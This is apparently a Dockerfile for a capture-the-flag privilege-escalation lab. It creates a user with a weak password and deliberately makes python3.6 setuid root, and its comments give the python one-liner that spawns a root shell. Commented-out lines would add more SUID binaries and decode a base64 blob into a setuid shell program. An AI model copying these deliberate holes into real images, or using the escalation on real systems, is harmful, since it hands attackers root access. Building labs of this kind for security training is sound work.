#pepe -> admin -> root
#/home/pepe/flag1 -> /home/admin/flag2 -> flag3
FROM rastasheep/ubuntu-sshd

#create the new user
#this user is used for pivoting to the admin user
RUN useradd -m pepe -s /bin/bash
RUN echo "pepe:iloveyou" | chpasswd

#Set language and keyboard to Spanish
RUN echo "LC_ALL=es_ES.UTF-8" >> /etc/environment
RUN echo "es_ES.UTF-8 UTF-8" >> /etc/locale.gen
RUN echo "LANG=es_ES.UTF-8" > /etc/locale.conf
RUN echo '* libraries/restart-without-asking boolean true'

#RUN echo 'USCGA{test-flag}' > /home/pepe/flag.txt

RUN apt-get update -y
RUN apt-get install vim -y

#find / -perm /4000
# cd /usr/bin
# ./python3.6 -c 'import os; os.setuid(0); os.system("/bin/sh")'

RUN chmod u+s /usr/bin/python3.6



WORKDIR /home/pepe
COPY flag.txt /
RUN chown -cR root. /flag.txt
RUN chmod 400 /flag.txt
#RUN mv /flag.txt /home/root

#RUN chmod u+s /bin/cp
#RUN chmod u+s /usr/bin/find
#RUN chmod u+s /usr/bin/vim.basic
#RUN chmod u+s /bin/nano
#RUN echo "H4sIANIThl4AA1XKMQrDMAxA0Tk6hbEXe6m7J+QuSSwaQa2GSB5MyN1rL4VOHx7fEW/vktBMook+j30G96PC1PTfpErUeqB0BmI1eSH2AS4YBLVQ8i9U7A1hbFZFMXsbV+K4LrLbrmc7TzbPEW74AlJpq/+DAAAA" | base64 -d | gunzip > /asroot.c
#RUN gcc /asroot.c -o /shell
#RUN chmod u+s /shell
#USER user1